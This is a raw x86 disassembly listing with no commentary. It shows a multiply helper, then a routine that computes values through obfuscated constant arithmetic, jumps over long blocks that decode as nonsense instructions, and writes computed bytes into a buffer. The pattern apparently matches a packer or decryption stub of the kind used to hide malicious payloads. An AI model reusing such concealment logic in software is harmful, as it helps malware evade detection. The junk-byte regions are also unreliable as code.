  416c1b:	pop    ebx
  416c1c:	leave  
  416c1d:	ret    0x10
  416c20:	or     eax,eax
  416c22:	mov    eax,DWORD PTR [esp+0x8]
  416c26:	sub    ecx,0x3e9e
  416c2c:	mov    ecx,DWORD PTR [esp+0x10]
  416c30:	or     ecx,eax
  416c32:	mov    DWORD PTR ds:0x42820f,ecx
  416c38:	mov    ecx,DWORD PTR [esp+0xc]
  416c3c:	jne    0x416c55
  416c42:	mov    eax,DWORD PTR [esp+0x4]
  416c46:	xor    DWORD PTR ds:0x42833b,0x1fc6
  416c50:	mul    ecx
  416c52:	ret    0x10
  416c55:	sub    DWORD PTR ds:0x4281eb,0x3993
  416c5f:	push   ebx
  416c60:	sbb    DWORD PTR ds:0x428263,0x3efd
  416c6a:	mul    ecx
  416c6c:	add    DWORD PTR ds:0x4282c3,0x5330
  416c76:	mov    ebx,eax
  416c78:	xor    eax,eax
  416c7a:	add    eax,DWORD PTR ds:0x4281ab
  416c80:	mov    eax,DWORD PTR [eax]
  416c82:	adc    DWORD PTR ds:0x4281ef,eax
  416c88:	mov    eax,DWORD PTR [esp+0x8]
  416c8c:	mul    DWORD PTR [esp+0x14]
  416c90:	add    ebx,eax
  416c92:	mov    eax,DWORD PTR [esp+0x8]
  416c96:	mul    ecx
  416c98:	add    edx,ebx
  416c9a:	pop    ebx
  416c9b:	ret    0x10
  416c9e:	push   ebp
  416c9f:	mov    ebp,esp
  416ca1:	sub    esp,0x44
  416ca4:	push   ebx
  416ca5:	push   esi
  416ca6:	push   edi
  416ca7:	mov    DWORD PTR [ebp-0x18],0x2
  416cae:	mov    DWORD PTR [ebp-0x14],0x29f0
  416cb5:	mov    DWORD PTR [ebp-0x10],0x3716
  416cbc:	mov    DWORD PTR [ebp-0x2c],0x4e09
  416cc3:	mov    DWORD PTR [ebp-0x28],0x4497
  416cca:	mov    DWORD PTR [ebp-0x24],0x5
  416cd1:	mov    DWORD PTR [ebp-0x20],0x2a0a
  416cd8:	mov    DWORD PTR [ebp-0x1c],0x1
  416cdf:	mov    DWORD PTR [ebp-0xc],0xce6
  416ce6:	mov    DWORD PTR [ebp-0x8],0x12b3
  416ced:	mov    DWORD PTR [ebp-0x4],0xb09
  416cf4:	mov    DWORD PTR [ebp-0x44],0x7617
  416cfb:	mov    DWORD PTR [ebp-0x40],0x721a
  416d02:	mov    DWORD PTR [ebp-0x3c],0x5151
  416d09:	mov    DWORD PTR [ebp-0x38],0x14aa
  416d10:	mov    DWORD PTR [ebp-0x34],0x5a28
  416d17:	mov    DWORD PTR [ebp-0x30],0x19a8
  416d1e:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d21:	mov    eax,DWORD PTR [ebp-0x20]
  416d24:	xor    edx,edx
  416d26:	div    ecx
  416d28:	mov    ecx,DWORD PTR [ebp-0x24]
  416d2b:	xor    edx,edx
  416d2d:	mov    esi,0x1ac5
  416d32:	push   0x20
  416d34:	div    ecx
  416d36:	mov    ecx,DWORD PTR [ebp-0x28]
  416d39:	xor    edx,edx
  416d3b:	xor    eax,0x60dc
  416d40:	sub    eax,ecx
  416d42:	mov    ecx,DWORD PTR [ebp-0x2c]
  416d45:	lea    edi,[eax+ecx*1-0x6300]
  416d4c:	mov    eax,DWORD PTR [ebp-0x4]
  416d4f:	mov    ecx,DWORD PTR [ebp-0x8]
  416d52:	sub    eax,0x7721
  416d57:	xor    eax,ecx
  416d59:	mov    ecx,DWORD PTR [ebp-0xc]
  416d5c:	xor    eax,ecx
  416d5e:	or     eax,0x7bc9
  416d63:	xor    eax,0xfffff0db
  416d68:	mov    ebx,edi
  416d6a:	sub    ebx,eax
  416d6c:	jmp    0x4170a9
  416d71:	dec    ebx
  416d72:	jbe    0x416da1
  416d74:	imul   BYTE PTR [edx+ebp*4]
  416d77:	dec    ebx
  416d78:	sub    dl,dh
  416d7a:	push   0xffffffc1
  416d7c:	mov    al,0xbe
  416d7e:	mov    eax,0xf47aaae7
  416d83:	push   ss
  416d84:	sbb    cl,ah
  416d86:	adc    bl,BYTE PTR [eax]
  416d88:	sbb    cl,ch
  416d8a:	popa   
  416d8b:	pop    ecx
  416d8c:	sub    DWORD PTR [ebx+0x4d],esi
  416d8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d90:	arpl   WORD PTR [esi],bx
  416d92:	mov    dl,0xf4
  416d94:	icebp  
  416d95:	sub    al,BYTE PTR fs:[ebx]
  416d98:	jb     0x416de7
  416d9a:	mov    ds:0x5fb93727,eax
  416d9f:	inc    ebx
  416da0:	adc    dh,dh
  416da2:	retf   
  416da3:	jnp    0x416d4a
  416da5:	jecxz  0x416dbe
  416da7:	mov    bl,BYTE PTR [eax+0x56]
  416daa:	xchg   esi,eax
  416dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dac:	add    cl,dh
  416dae:	push   ebx
  416daf:	fmul   DWORD PTR [ebx]
  416db1:	mov    ebx,ss
  416db3:	dec    eax
  416db4:	je     0x416e03
  416db6:	arpl   WORD PTR [edi-0x79],dx
  416db9:	xchg   edx,eax
  416dba:	ja     0x416e26
  416dbc:	popf   
  416dbd:	cmp    eax,0x472fee3e
  416dc2:	pop    ebx
  416dc3:	dec    edx
  416dc4:	lahf   
  416dc5:	mov    cl,0xc8
  416dc7:	add    BYTE PTR [edx-0x15],bl
  416dca:	fld    QWORD PTR [edi]
  416dcc:	div    ebp
  416dce:	daa    
  416dcf:	ret    
  416dd0:	sub    eax,0xf8b71ce0
  416dd5:	js     0x416d93
  416dd7:	pop    ecx
  416dd8:	pop    DWORD PTR ds:0x20bc988
  416dde:	into   
  416ddf:	mov    esp,0x88fab59d
  416de4:	repnz das 
  416de6:	lods   eax,DWORD PTR ds:[esi]
  416de7:	sub    al,0xf8
  416de9:	mov    ecx,0x73a16240
  416dee:	jmp    0x416dca
  416df0:	(bad)  
  416df1:	adc    eax,0x81c7caad
  416df6:	dec    edi
  416df7:	push   esp
  416df8:	adc    ecx,DWORD PTR [edx+0x4fd20fc2]
  416dfe:	call   0x2b26b395
  416e03:	lods   al,BYTE PTR ds:[esi]
  416e04:	xlat   BYTE PTR ds:[ebx]
  416e05:	jl     0x416e0a
  416e07:	pop    eax
  416e08:	ins    BYTE PTR es:[edi],dx
  416e09:	jg     0x416dd1
  416e0b:	mov    edx,0xf46c528d
  416e10:	cld    
  416e11:	icebp  
  416e12:	es std 
  416e14:	lods   al,BYTE PTR ds:[esi]
  416e15:	jne    0x416e01
  416e17:	xor    esi,ecx
  416e19:	outs   dx,DWORD PTR ds:[esi]
  416e1a:	fwait
  416e1b:	iret   
  416e1c:	lods   eax,DWORD PTR ds:[esi]
  416e1d:	cmp    eax,0x5a8d5a41
  416e22:	jmp    0x447f2a95
  416e27:	jns    0x416e97
  416e29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e2a:	(bad)  
  416e2b:	xchg   edx,eax
  416e2c:	stos   BYTE PTR es:[edi],al
  416e2d:	sub    DWORD PTR [ecx+0x3],esi
  416e30:	cwde   
  416e31:	cmp    eax,0xad41afac
  416e36:	sub    eax,0x31091c56
  416e3b:	xchg   DWORD PTR [esi+0x6],ebx
  416e3e:	das    
  416e3f:	mov    bl,0x94
  416e41:	fs sbb eax,0xc7a68539
  416e47:	cld    
  416e48:	mov    edi,0x2122e0ef
  416e4d:	push   edx
  416e4e:	sar    DWORD PTR [edx],0x74
  416e51:	add    ebp,ecx
  416e53:	or     ecx,ebx
  416e55:	pop    ecx
  416e56:	or     al,0x31
  416e58:	outs   dx,BYTE PTR ds:[esi]
  416e59:	addr16 std 
  416e5b:	push   esi
  416e5c:	and    eax,0x9c9e5a57
  416e61:	pop    eax
  416e62:	cmp    eax,0xfeefd1e1
  416e67:	cmp    al,0x2e
  416e69:	ins    DWORD PTR es:[edi],dx
  416e6a:	retf   0x54a7
  416e6d:	inc    ebx
  416e6e:	xchg   edx,eax
  416e6f:	add    DWORD PTR [esi],ebp
  416e71:	ret    
  416e72:	imul   esi,ecx,0x4bd0a92
  416e78:	or     DWORD PTR [ebx+0x1ea81b5c],ecx
  416e7e:	jae    0x416ed0
  416e80:	fucomip st,st(0)
  416e82:	pop    ecx
  416e83:	rol    BYTE PTR [esi],0x30
  416e86:	mov    cl,0xd9
  416e88:	push   esp
  416e89:	clc    
  416e8a:	sbb    ebp,edx
  416e8c:	arpl   bp,ax
  416e8e:	je     0x416e6a
  416e90:	stos   DWORD PTR es:[edi],eax
  416e91:	push   0xffffff85
  416e93:	cmp    eax,0xb3c110da
  416e98:	shr    esi,1
  416e9a:	ret    0x6ff3
  416e9d:	in     eax,dx
  416e9e:	(bad)  [ebx+edi*4]
  416ea1:	and    eax,0xf98a30a6
  416ea6:	mov    edx,eax
  416ea8:	adc    DWORD PTR [esi-0x73dcdd16],ecx
  416eae:	sbb    eax,0x4f78e363
  416eb3:	mov    ecx,0x75393b7d
  416eb8:	fnstsw WORD PTR [esi-0x6bc27b60]
  416ebe:	nop
  416ebf:	sbb    esi,DWORD PTR gs:[eax]
  416ec2:	(bad)  
  416ec3:	mov    bl,0x75
  416ec5:	xchg   DWORD PTR [ebp+0x45536cbd],ebp
  416ecb:	js     0x416e97
  416ecd:	or     bh,ah
  416ecf:	or     ch,BYTE PTR [eax]
  416ed1:	dec    ebp
  416ed2:	and    al,0x4a
  416ed4:	jb     0x416e64
  416ed6:	cmp    DWORD PTR [ecx+eiz*2-0x7d],0x524b2954
  416ede:	int3   
  416edf:	cs add esp,0xfffffff1
  416ee3:	stos   DWORD PTR es:[edi],eax
  416ee4:	mov    eax,ds:0xbf8480dc
  416ee9:	(bad)  
  416eea:	cmp    eax,0xffffffc9
  416eed:	sub    al,0x44
  416eef:	into   
  416ef0:	mov    al,ds:0x4acedd2d
  416ef5:	mov    edi,0xdd4e57b9
  416efa:	xor    ah,ch
  416efc:	into   
  416efd:	and    esi,DWORD PTR [esi+0x43]
  416f00:	(bad)  
  416f01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f02:	or     bh,BYTE PTR ss:[ecx+0x37]
  416f06:	pop    ebx
  416f07:	xchg   DWORD PTR [edx-0x329b6f17],esp
  416f0d:	inc    esi
  416f0e:	xor    eax,0x85674bdd
  416f13:	xor    eax,0x5b3ea5df
  416f18:	hlt    
  416f19:	dec    ebp
  416f1a:	mov    ebp,0x4b223503
  416f1f:	mov    DWORD PTR [ebx+edi*2+0x10],0x8d034399
  416f27:	std    
  416f28:	and    eax,0xe0585223
  416f2d:	cs cdq 
  416f2f:	dec    edx
  416f30:	mov    dl,0xea
  416f32:	sti    
  416f33:	lahf   
  416f34:	fwait
  416f35:	dec    esi
  416f36:	add    eax,0xb6e2ef2c
  416f3b:	mov    bh,0x5e
  416f3d:	rol    DWORD PTR [ecx],cl
  416f3f:	fdivr  DWORD PTR [ecx]
  416f41:	dec    esi
  416f42:	mov    ch,BYTE PTR [edi]
  416f44:	mov    dl,0xb7
  416f46:	lock call 0xa40:0x8d3adbf6
  416f4e:	fndisi(8087 only) 
  416f50:	repz add DWORD PTR [esi+0x35],esi
  416f54:	lahf   
  416f55:	push   0x6016a812
  416f5a:	pop    ss
  416f5b:	fisubr DWORD PTR [esi-0x49]
  416f5e:	jmp    0x18ba:0xc8739f6a
  416f65:	pop    ds
  416f66:	hlt    
  416f67:	sub    bh,bl
  416f69:	pop    es
  416f6a:	adc    BYTE PTR [esi-0x5d298c34],dh
  416f70:	push   0xfffffff2
  416f72:	xchg   edi,eax
  416f73:	xchg   BYTE PTR [ebx-0x3f],dh
  416f76:	les    eax,FWORD PTR [ecx]
  416f78:	pop    ds
  416f79:	adc    esp,esi
  416f7b:	std    
  416f7c:	cdq    
  416f7d:	sbb    bh,BYTE PTR [ebp+esi*2+0x7a]
  416f81:	sahf   
  416f82:	jnp    0x416fbd
  416f84:	xchg   edi,esi
  416f86:	sar    WORD PTR [esi+0x3d3ecfc3],0x8c
  416f8e:	mov    ebx,0xbfdb8d41
  416f93:	push   ecx
  416f94:	dec    ebp
  416f95:	mov    ecx,0x8e553a9f
  416f9a:	sbb    ah,BYTE PTR [ebx*4+0x75dc5cc]
  416fa1:	inc    ebx
  416fa2:	sub    ecx,DWORD PTR [eax]
  416fa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fa5:	retf   
  416fa6:	outs   dx,DWORD PTR ds:[esi]
  416fa7:	or     BYTE PTR [ebp+0x53],dl
  416faa:	popa   
  416fab:	mov    ebx,0x61968fbc
  416fb0:	sub    eax,0xfc437084
  416fb5:	cmc    
  416fb6:	sub    esi,edx
  416fb8:	cmp    al,0xf3
  416fba:	loopne 0x416f94
  416fbc:	push   ds
  416fbd:	enter  0xf558,0x2
  416fc1:	mov    ds:0x3a038ea7,eax
  416fc6:	es sahf 
  416fc8:	mov    bh,0xfa
  416fca:	dec    eax
  416fcb:	push   esi
  416fcc:	or     BYTE PTR [ecx+0x3c],al
  416fcf:	fcomi  st,st(1)
  416fd1:	test   al,dh
  416fd3:	push   eax
  416fd4:	mov    ch,0x5a
  416fd6:	pop    ss
  416fd7:	js     0x41704b
  416fd9:	div    BYTE PTR [edi+0x67a95ad5]
  416fdf:	adc    BYTE PTR [edi],0x1
  416fe2:	sbb    al,0xc2
  416fe4:	xor    BYTE PTR [eax],dl
  416fe6:	nop
  416fe7:	add    BYTE PTR [ecx+0x3],0xd3
  416feb:	stos   DWORD PTR es:[edi],eax
  416fec:	js     0x416fb7
  416fee:	in     eax,0xca
  416ff0:	cmp    DWORD PTR [eax+ecx*8-0x5513ce],edx
  416ff7:	idiv   BYTE PTR [ebx+0x62]
  416ffa:	cmp    cl,ah
  416ffc:	pop    ebx
  416ffd:	or     dl,BYTE PTR [ebx-0xec1b005]
  417003:	fwait
  417004:	jno    0x417042
  417006:	addr16 aad 0xd5
  417009:	cmp    DWORD PTR [edi-0x19946dab],esp
  41700f:	(bad)  
  417010:	sub    DWORD PTR [ebx-0xcf1bb6f],ecx
  417016:	lea    esp,[edi]
  417018:	(bad)
  41701b:	mov    bh,0xb6
  41701d:	mov    al,0xe2
  41701f:	pop    ebp
  417020:	mov    cl,0xe
  417022:	popf   
  417023:	dec    esi
  417024:	push   ecx
  417025:	adc    eax,0xe3aac478
  41702a:	xchg   edi,eax
  41702b:	mov    edi,edx
  41702d:	ins    BYTE PTR es:[edi],dx
  41702e:	push   ebx
  41702f:	mov    eax,ds:0x863300aa
  417034:	and    ebp,DWORD PTR [edi-0x19]
  417037:	into   
  417038:	cmp    al,0xf6
  41703a:	sub    eax,0x4e8de24b
  41703f:	xor    BYTE PTR [eax],0xb9
  417042:	in     eax,dx
  417043:	xchg   ebp,eax
  417044:	mov    dh,0x44
  417046:	rcl    DWORD PTR [ebx],cl
  417048:	mov    BYTE PTR [esi+0x71],ch
  41704b:	aaa    
  41704c:	fwait
  41704d:	lods   al,BYTE PTR ds:[esi]
  41704e:	int    0x55
  417050:	cdq    
  417051:	dec    ebp
  417052:	cwde   
  417053:	jle    0x417063
  417055:	out    dx,eax
  417056:	imul   ecx,eax,0xe6905eba
  41705c:	retf   
  41705d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41705e:	xchg   esp,eax
  41705f:	inc    esi
  417060:	mov    ds:0x1ddda40f,al
  417065:	xlat   BYTE PTR ds:[ebx]
  417066:	dec    esp
  417067:	hlt    
  417068:	xchg   edi,ebp
  41706a:	enter  0xef38,0x48
  41706e:	xlat   BYTE PTR ds:[ebx]
  41706f:	sar    DWORD PTR [esi],cl
  417071:	sub    al,0x25
  417073:	xor    dl,0x1c
  417076:	and    dl,BYTE PTR [edx+0x5314f743]
  41707c:	nop
  41707d:	(bad)  
  41707f:	(bad)  
  417080:	mov    esp,0x4a8855d
  417085:	mov    bh,0xdb
  417087:	jnp    0x417051
  417089:	ds jb  0x417013
  41708c:	out    0x20,al
  41708e:	mov    edx,0x9f3797b8
  417093:	test   eax,0x3e96a17b
  417098:	jecxz  0x417049
  41709a:	mov    eax,0x79d49c7b
  41709f:	pop    ds
  4170a0:	mov    dh,0xe
  4170a2:	mov    ecx,0x1e57f4fa
  4170a7:	(bad)  
  4170a8:	into   
  4170a9:	mov    eax,DWORD PTR [ebp-0x10]
  4170ac:	mov    ecx,DWORD PTR [ebp-0x14]
  4170af:	xor    eax,ecx
  4170b1:	mov    ecx,DWORD PTR [ebp-0x18]
  4170b4:	sub    eax,esi
  4170b6:	div    ecx
  4170b8:	mov    ecx,0x211
  4170bd:	pop    edx
  4170be:	xor    eax,ecx
  4170c0:	sub    edx,eax
  4170c2:	cmp    ebx,edx
  4170c4:	ja     0x4174cb
  4170ca:	jmp    0x4170d2
  4170cf:	mov    edi,DWORD PTR [ebp-0x2c]
  4170d2:	mov    DWORD PTR [ebp-0x20],0x1aa3
  4170d9:	mov    DWORD PTR [ebp-0x24],0x52d
  4170e0:	mov    DWORD PTR [ebp-0x28],0x226c
  4170e7:	mov    DWORD PTR [ebp-0x2c],0x347d
  4170ee:	mov    eax,DWORD PTR [ebp-0x2c]
  4170f1:	mov    edx,DWORD PTR [ebp-0x28]
  4170f4:	mov    ebx,DWORD PTR [ebp-0x24]
  4170f7:	sub    eax,0x24b3
  4170fc:	imul   eax,edx
  4170ff:	xor    eax,0x74ef
  417104:	xor    edx,edx
  417106:	div    ebx
  417108:	mov    edx,DWORD PTR [ebp-0x20]
  41710b:	mov    ebx,DWORD PTR [ebp+0x8]
  41710e:	push   0x20
  417110:	and    eax,edx
  417112:	mov    edx,edi
  417114:	sub    edx,eax
  417116:	sub    edx,0x683
  41711c:	mov    DWORD PTR [ebp-0x2c],edx
  41711f:	mov    eax,DWORD PTR [ebp-0x30]
  417122:	mov    edx,DWORD PTR [ebp-0x34]
  417125:	xor    al,dl
  417127:	mov    edx,DWORD PTR [ebp-0x2c]
  41712a:	xor    al,0x58
  41712c:	and    al,0xd8
  41712e:	add    al,BYTE PTR [ebp+0xc]
  417131:	add    al,0x28
  417133:	mov    BYTE PTR [edx+ebx*1],al
  417136:	mov    eax,DWORD PTR [ebp-0x38]
  417139:	add    eax,DWORD PTR [ebp-0x3c]
  41713c:	mov    edx,DWORD PTR [ebp-0x40]
  41713f:	xor    eax,edx
  417141:	mov    edx,DWORD PTR [ebp-0x44]
  417144:	xor    eax,edx
  417146:	mov    edx,0x61f7
  41714b:	sub    edx,eax
  41714d:	mov    eax,DWORD PTR [ebp-0x4]
  417150:	add    edi,edx
  417152:	mov    edx,DWORD PTR [ebp-0x8]
  417155:	sub    eax,0x7721
  41715a:	xor    eax,edx
  41715c:	mov    edx,DWORD PTR [ebp-0xc]
  41715f:	xor    eax,edx
  417161:	or     eax,0x7bc9
  417166:	xor    eax,0xfffff0db
  41716b:	mov    DWORD PTR [ebp-0x2c],edi
  41716e:	sub    edi,eax
  417170:	mov    eax,DWORD PTR [ebp-0x10]
  417173:	mov    edx,DWORD PTR [ebp-0x14]
  417176:	mov    ebx,DWORD PTR [ebp-0x18]
  417179:	xor    eax,edx
  41717b:	xor    edx,edx
  41717d:	sub    eax,esi
  41717f:	div    ebx
  417181:	jmp    0x4174be
  417186:	in     al,0x6b
  417188:	retf   
  417189:	repnz cmp dh,BYTE PTR [ebx]
  41718c:	pushf  
  41718d:	pop    edx
  41718e:	stos   BYTE PTR es:[edi],al
  41718f:	mov    DWORD PTR [edi+0x6a],0xaa59c34d
  417196:	inc    edx
  417197:	out    dx,al
  417198:	push   ss
  417199:	sbb    cl,ah
  41719b:	adc    bl,BYTE PTR [eax]
  41719d:	sbb    BYTE PTR [ecx-0x1ed8f24d],dh
  4171a3:	mov    bh,0x35
  4171a6:	in     eax,dx
  4171a7:	test   eax,0x5ef68122
  4171ac:	push   eax
  4171ad:	js     0x4171b9
  4171af:	pop    ds
  4171b0:	jle    0x4171d3
  4171b2:	mov    ebx,0xaf1f2a49
  4171b7:	jle    0x4171a7
  4171b9:	or     BYTE PTR [eax+0x47],0x98
  4171bd:	and    al,0x4c
  4171bf:	in     eax,0xa2
  4171c1:	push   edi
  4171c2:	push   eax
  4171c3:	jb     0x41716b
  4171c5:	(bad)  
  4171c6:	jae    0x417202
  4171c8:	out    0x2,eax
  4171ca:	xlat   BYTE PTR ds:[ebx]
  4171cb:	jbe    0x4171bd
  4171cd:	cmp    al,0xba
  4171cf:	mov    eax,ds
  4171d1:	and    ah,ah
  4171d3:	(bad)  
  4171d4:	icebp  
  4171d5:	lea    esp,[edx-0x4a492355]
  4171db:	scas   eax,DWORD PTR es:[edi]
  4171dc:	fsubp  st(4),st
  4171de:	dec    esi
  4171df:	mov    al,0xa8
  4171e1:	cmp    BYTE PTR [ecx],0xe2
  4171e4:	inc    esi
  4171e5:	mov    dh,dh
  4171e7:	fs push esp
  4171e9:	imul   eax,edx,0x7d
  4171ec:	jle    0x4171d6
  4171ee:	xor    al,0x38
  4171f0:	jo     0x41721d
  4171f2:	xchg   BYTE PTR [ebp+ebp*1-0x77],cl
  4171f6:	retf   
  4171f7:	sbb    eax,0x46383623
  4171fc:	xlat   BYTE PTR ds:[ebx]
  4171fd:	test   al,bh
  4171ff:	jnp    0x4171a9
  417201:	add    DWORD PTR [edi],0x4b
  417204:	int    0x1d
  417206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417207:	cli    
  417208:	setle  BYTE PTR [esi-0x7b]
  41720c:	xlat   BYTE PTR ds:[ebx]
  41720d:	les    edx,FWORD PTR [ebx-0x65]
  417210:	push   ss
  417211:	mov    ds,WORD PTR [ebp+0x1]
  417214:	cdq    
  417215:	sub    eax,0x10c8472f
  41721a:	mov    eax,ebp
  41721c:	sub    dl,BYTE PTR [edx+0x7076190b]
  417222:	jne    0x41722d
  417224:	inc    ebx
  417225:	or     bl,bh
  417227:	nop
  417228:	(bad)  
  417229:	mov    dh,0x42
  41722b:	fdiv   DWORD PTR [eax]
  41722d:	pop    ss
  41722e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41722f:	or     DWORD PTR [ebx],0x479984d1
  417235:	ret    
  417236:	xchg   ebx,eax
  417237:	leave  
  417238:	repnz outs dx,BYTE PTR ds:[esi]
  41723a:	jmp    0x417244
  41723c:	out    0x8c,eax
  41723e:	mov    ebx,0x5411826a
  417243:	lahf   
  417244:	add    BYTE PTR [ebp+0x8],ah
  417247:	mov    dl,0x17
  417249:	pop    ebp
  41724a:	sbb    DWORD PTR [eax-0x267fa334],ebp
  417250:	mov    edx,DWORD PTR [ecx+eiz*1-0x63194a1f]
  417257:	int    0xb9
  417259:	cdq    
  41725a:	dec    edx
  41725b:	aaa    
  41725c:	cs ins DWORD PTR es:[edi],dx
  41725e:	dec    ebp
  41725f:	or     al,0xac
  417261:	popa   
  417262:	jne    0x417245
  417264:	jns    0x4172bd
  417266:	sub    al,0x22
  417268:	loope  0x41728a
  41726a:	arpl   WORD PTR [ebp+0x5c],bp
  41726d:	(bad)  
  41726e:	jmp    0x417263
  417270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417271:	out    dx,eax
  417272:	mov    cl,0x69
  417274:	xchg   ecx,eax
  417275:	xor    BYTE PTR [eax+0x126ca923],bl
  41727b:	sbb    al,0xe0
  41727d:	push   esp
  41727e:	push   esi
  41727f:	mov    dl,0xf6
  417281:	mov    ch,0xc6
  417283:	or     BYTE PTR [esi-0xa],dh
  417286:	mov    esp,0xe5b5f9a
  41728b:	inc    ebx
  41728c:	push   esi
  41728d:	aaa    
  41728e:	xchg   DWORD PTR [edx],ecx
  417290:	arpl   WORD PTR [ecx],dx
  417292:	sbb    eax,ecx
  417294:	mov    eax,ds:0x6c8c39ee
  417299:	call   0xbf4b:0x7156c6f4
  4172a0:	mov    ebp,0x1516880d
  4172a5:	das    
  4172a6:	pop    eax
  4172a7:	dec    edi
  4172a8:	into   
  4172a9:	mov    esi,0x421cca1e
  4172ae:	mov    esi,0xa9dd6f15
  4172b3:	(bad)  
  4172b4:	test   al,0x26
  4172b6:	and    al,ah
  4172b8:	and    DWORD PTR [eax-0x4adecf84],ebx
  4172be:	ret    0xeef1
  4172c1:	pop    edi
  4172c2:	int3   
  4172c3:	pop    edi
  4172c4:	pushf  
  4172c5:	lods   al,BYTE PTR ds:[esi]
  4172c6:	icebp  
  4172c7:	push   esp
  4172c8:	inc    edx
  4172c9:	mov    ah,0x8d
  4172cb:	mov    ch,0x71
  4172cd:	fdivr  DWORD PTR [edi-0x15]
  4172d0:	repnz mov ebp,0xf0bafe5a
  4172d6:	scas   al,BYTE PTR es:[edi]
  4172d7:	adc    bl,dl
  4172d9:	scas   al,BYTE PTR es:[edi]
  4172da:	dec    esp
  4172db:	push   0xffffffc2
  4172dd:	inc    ecx
  4172de:	inc    esi
  4172df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172e0:	rcl    DWORD PTR [ebx+0x4f],0x5a
  4172e4:	xchg   ebp,eax
  4172e5:	mov    dl,ch
  4172e7:	in     al,0xb1
  4172e9:	mov    al,0x6e
  4172eb:	dec    ebx
  4172ec:	in     eax,0x1a
  4172ee:	sahf   
  4172ef:	add    DWORD PTR ds:0xb03da5d,0x28
  4172f6:	ror    ebp,0xc4
  4172f9:	pop    ebx
  4172fa:	imul   DWORD PTR [edi-0x73]
  4172fd:	sub    DWORD PTR [edx-0x12201ebd],edx
  417303:	dec    ebx
  417304:	aas    
  417305:	jmp    0x1e697722
  41730a:	and    dh,BYTE PTR [ebp+edi*4-0x2a3b492e]
  417311:	mov    edx,es
  417313:	cmp    edx,DWORD PTR [edx+eax*2]
  417316:	mov    cl,0x8b
  417318:	pusha  
  417319:	sbb    al,0xb1
  41731b:	fcomp  DWORD PTR [eax+edx*2-0x52b28c41]
  417322:	mov    esp,0x245f39ea
  417327:	jns    0x4172f0
  417329:	mov    bl,0x48
  41732b:	inc    ebp
  41732c:	enter  0xabaa,0x45
  417330:	mov    bl,0x69
  417332:	xchg   esp,eax
  417333:	ror    BYTE PTR [ebp+eax*2-0x205bfe1],0xd1
  41733b:	outs   dx,BYTE PTR ds:[esi]
  41733c:	lds    ecx,FWORD PTR [ebx-0x38]
  41733f:	ja     0x4173bc
  417341:	pop    ebx
  417342:	sar    DWORD PTR [edx],0x3d
  417345:	sbb    al,0x62
  417347:	mov    fs:0x7ff5f0b2,eax
  41734d:	std    
  41734e:	jae    0x4172d3
  417350:	mov    ebp,0x7d24687a
  417355:	loope  0x4173bb
  417357:	xchg   edx,eax
  417358:	or     DWORD PTR [ecx],esp
  41735a:	dec    edi
  41735b:	and    esp,edx
  41735d:	lds    esp,FWORD PTR [ebx+0x54]
  417360:	xchg   esi,eax
  417361:	dec    ecx
  417362:	and    al,0xb9
  417364:	hlt    
  417365:	jns    0x417346
  417367:	dec    esp
  417368:	mov    edx,0x261478de
  41736d:	sti    
  41736e:	xchg   esi,eax
  41736f:	jmp    0x417352
  417371:	(bad)  
  417372:	adc    ah,BYTE PTR [ebx+0x31]
  417375:	gs mov ch,0xfd
  417378:	fadd   st,st(0)
  41737a:	push   es
  41737b:	ja     0x41733c
  41737d:	in     al,dx
  41737e:	pop    ebx
  41737f:	inc    esi
  417380:	inc    eax
  417381:	xchg   ebx,eax
  417382:	loopne 0x417355
  417384:	dec    ebx
  417385:	aas    
  417386:	call   0x6a065ba4
  41738b:	mov    ds:0xcc84a66b,eax
  417390:	xor    al,0x22
  417392:	mov    al,0x7b
  417394:	arpl   WORD PTR [esi-0x5dc6c501],si
  41739a:	cmp    al,0x14
  41739c:	xchg   esi,eax
  41739d:	fnstenv [esi-0x51]
  4173a0:	inc    edi
  4173a1:	shl    DWORD PTR [eax+ebp*2],0x6b
  4173a5:	test   DWORD PTR [ecx],esi
  4173a7:	ins    DWORD PTR es:[edi],dx
  4173a8:	popa   
  4173a9:	cmp    bl,BYTE PTR fs:[edi-0x16]
  4173ad:	into   
  4173ae:	pop    edx
  4173af:	push   ds
  4173b0:	sub    esi,DWORD PTR [esi]
  4173b2:	add    BYTE PTR [ecx-0x67],0xbd
  4173b6:	push   ecx
  4173b7:	ss mov ch,0xce
  4173bb:	pop    ss
  4173bc:	mov    ?,ecx
  4173be:	inc    edi
  4173bf:	and    ebx,0x7f
  4173c2:	jbe    0x417429
  4173c4:	ins    DWORD PTR es:[edi],dx
  4173c5:	xchg   edi,eax
  4173c6:	mov    esi,es
  4173c8:	push   0xffffff92
  4173ca:	mov    ds:0x3a5d39c3,eax
  4173cf:	jle    0x41742d
  4173d1:	add    DWORD PTR [esp+ebp*8+0x2eabe162],ebx
  4173d8:	pop    esp
  4173d9:	pinsrw mm4,WORD PTR [eax+0x4b3ddd07],0xf0
  4173e1:	push   esi
  4173e2:	dec    ebp
  4173e3:	jge    0x41737c
  4173e5:	(bad)  
  4173e6:	cld    
  4173e7:	pop    ds
  4173e8:	inc    edx
  4173e9:	fdivp  st(5),st
  4173eb:	dec    edx
  4173ec:	hlt    
  4173ed:	mov    ebp,0xaa3a569e
  4173f2:	jae    0x417466
  4173f4:	mov    ?,WORD PTR [edx+0x40672fae]
  4173fa:	(bad)  
  4173fb:	loop   0x41742f
  4173fd:	test   ebp,ebp
  4173ff:	push   cs
  417400:	xchg   DWORD PTR [esi-0x75],eax
  417403:	sub    esp,DWORD PTR [ebp+0x62b2ba62]
  417409:	jnp    0x417440
  41740b:	adc    DWORD PTR [ebx],edi
  41740d:	add    bh,BYTE PTR [ebp-0x6dee8163]
  417413:	pushf  
  417414:	adc    edi,DWORD PTR [edx-0x61cc4619]
  41741a:	jne    0x4173bc
  41741c:	jge    0x41740c
  41741e:	jbe    0x417462
  417420:	and    dl,BYTE PTR [eax-0x5da92931]
  417426:	lds    esi,FWORD PTR [ebx+0x36]
  417429:	inc    ecx
